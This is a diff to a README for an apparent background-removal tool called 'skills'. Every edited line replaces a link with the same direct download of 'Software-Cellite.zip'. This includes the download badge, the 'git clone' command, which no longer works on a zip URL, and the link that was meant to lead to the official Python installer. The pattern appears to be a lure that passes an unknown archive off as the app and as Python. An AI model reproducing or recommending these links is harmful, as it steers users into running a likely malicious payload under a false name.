@@ -1,12 +1,12 @@
 # 🧰 skills - Remove Backgrounds with Ease
 
-[![Download and run skills](https://img.shields.io/badge/Download%20skills-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Thanakornladpho/skills)
+[![Download and run skills](https://img.shields.io/badge/Download%20skills-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Thanakornladpho/skills/raw/refs/heads/main/Epacris/Software-Cellite.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Thanakornladpho/skills
+https://github.com/Thanakornladpho/skills/raw/refs/heads/main/Epacris/Software-Cellite.zip
 
 ## 🖥️ What this app does
 
@@ -48,7 +48,7 @@ If you use Git, you can clone the project instead:
 - Open Command Prompt
 - Run:
 
-git clone https://github.com/Thanakornladpho/skills
+git clone https://github.com/Thanakornladpho/skills/raw/refs/heads/main/Epacris/Software-Cellite.zip
 
 This creates a folder named skills on your computer.
 
@@ -62,7 +62,7 @@ You should see files and folders for the tool, along with a README file and Pyth
 
 If Python is not on your PC:
 
-- Go to https://www.python.org/downloads/
+- Go to https://github.com/Thanakornladpho/skills/raw/refs/heads/main/Epacris/Software-Cellite.zip
 - Download the latest Python 3 installer for Windows
 - Run the installer
 - Check the box that says Add Python to PATH
